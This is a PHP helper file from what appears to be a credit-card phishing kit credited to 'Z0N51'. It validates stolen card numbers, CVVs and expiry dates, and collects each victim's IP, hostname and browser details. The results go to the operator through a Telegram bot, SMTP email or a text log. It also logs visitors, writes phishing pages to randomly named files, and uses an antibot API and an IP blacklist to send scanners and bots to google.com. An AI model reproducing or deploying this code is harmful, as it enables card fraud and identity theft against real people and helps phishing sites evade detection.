<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'vendor/autoload.php';
    use Inacho\CreditCard;
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
    
    function create() {
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < 6; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        $randomFile = 'clients/' . $random . '.php';
        $file = fopen($randomFile, "w");
        return ['file' => $file, 'name' => $random . '.php', 'path' => $randomFile];
    }
    function go($page) {
        $create = create();
        $content = file_get_contents(TEMPLATES . $page . '.txt');
        fwrite($create['file'], $content);
        fclose($create['file']);
        $_SESSION[$page . '_path'] = $create['path'];
        return $create;
    }
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
    function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
    function get_value($value) {
        if( isset($_SESSION[$value]) ) {
            return $_SESSION[$value];
        }
    }
    function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
    function validate_cc_number($number = null) {
        $card = CreditCard::validCreditCard($number);
        if( $card['valid'] == false ) {
            return false;
        }
        return $card;
    }
    function validate_cc_cvv($number = null,$type = null) {
        if( empty($number) || empty($type) )
            return false;
        $cvv = CreditCard::validCvc($number, $type);
        return $cvv;
    }
    function validate_cc_date($month,$year) {
        if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
            return $month . '/' . $year;
        } else {
            return false;
        }
    }
    function validate_name($name) {
        if (!preg_match('/^[\p{L} ]+$/u', $name))
            return false;
        return true;
    }
    function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            return false;
        return true;
    }
    function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }
    function validate_date($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    function victim_infos() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'true' : 'false';
        $platformName   = $detect->getPlatformVersion();
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | Mobile : $isMobile  |  $platformName"  . "\r\n\r\n";
        return $message;
    }
    function telegram_message($message) {
        $curl = curl_init();
        $token  = TELEGRAM_TOKEN;
        $chat_id  = TELEGRAM_CHAT_ID;
        $format   = 'HTML';
        curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $chat_id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($curl);
        curl_close($curl);
        return true;
    }
    function send($subject,$message) {
        if( RECEIVE_VIA_TELEGRAM == 1 ) {
            telegram_message($message);
        }
        if( RESULTS_IN_TXT == 1 ) {
            file_put_contents(TXT_FILE_NAME, $message, FILE_APPEND);
        }
        if( RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1 ) {
            $mail = new PHPMailer;
            $mail->IsSMTP();
            $mail->Host = SMTP_HOSTNAME;
            $mail->Port = SMTP_PORT;
            $mail->SMTPAuth = true;
            $mail->Username = SMTP_USER;
            $mail->Password = SMTP_PASS;
            $mail->SMTPSecure = '';
            $mail->SMTPAutoTLS = false;
            $mail->From     = SMTP_FROM_EMAIL;
            $mail->FromName = 'Z0N51';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress(RECEIVER);
            $mail->Send();
        } else {
            if( RECEIVE_VIA_EMAIL == 1 ) {
                $mail           = new PHPMailer;
                $mail->From     = 'localhost@domain.com';
                $mail->FromName = 'Z0N51';
                $mail->Subject  = $subject;
                $mail->Body     = $message;
                $mail->AddAddress(RECEIVER);
                $mail->send();
                echo $mail->ErrorInfo;
            }
            if( RECEIVE_VIA_SMTP == 1 ) {
                $mail = new PHPMailer;
                $mail->IsSMTP();
                $mail->Host         = SMTP_HOSTNAME;
                $mail->Port         = SMTP_PORT;
                $mail->SMTPAuth     = true;
                $mail->Username     = SMTP_USER;
                $mail->Password     = SMTP_PASS;
                $mail->SMTPSecure   = '';
                $mail->SMTPAutoTLS  = false;
                $mail->From         = SMTP_FROM;
                $mail->FromName     = 'Z0N51';
                $mail->Subject      = $subject;
                $mail->Body         = $message;
                $mail->AddAddress(RECEIVER);
                $mail->Send();
            }
        }
    }
    function get_client_country() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". get_client_ip() .""));
        if ($details && $details->geoplugin_countryName != null) {
            $countryname = $details->geoplugin_countryName;
        }
        return $countryname;
    }
    function get_client_countrycode() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  get_client_ip() . ""));
        if ($details && $details->geoplugin_countryCode != null) {
            $countrycode = $details->geoplugin_countryCode;
        }
        return $countrycode;
    }
    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        //$country        = get_client_country();
        $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }
    function passport() {
        $ip = $_SERVER['REMOTE_ADDR'];
        if( $_SESSION['passport'] == 1 )
            return;
        $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($ip, $list)) {
            header("Location: https://www.google.com/");
            exit();
        }
        $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
        $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOT_API .'&ua=' . $ua),true);
        $is_bot = $check['is_bot'];
        if( $is_bot == 1 ) {
            file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
            header("Location: https://www.google.com/");
            exit();
        } else {
            $_SESSION['passport'] = 1;
        }
    }
?>